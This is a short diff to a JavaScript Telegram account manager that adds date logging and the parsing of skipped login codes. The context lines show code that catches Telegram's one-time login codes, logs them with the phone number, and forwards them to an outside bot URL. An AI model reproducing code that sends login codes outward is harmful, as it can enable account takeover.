@@ -267,6 +267,7 @@ class TelegramManager {
             if (event.message.chatId.toString() == "777000") {
                 console.log(event.message.text.toLowerCase());
                 console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
+                console.log("Date :", new Date(event.message.date * 1000));
                 await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(event.message.text)}`);
             }
         }
@@ -628,7 +629,9 @@ class TelegramManager {
                     return code;
                 }
                 else {
-                    console.log("Message Date: ", new Date(message.date).toISOString());
+                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
+                    const code = message.text.split('.')[0].split("code:**")[1].trim();
+                    console.log("Skipped Code: ", code);
                     await (0, Helpers_1.sleep)(5000);
                 }
             }
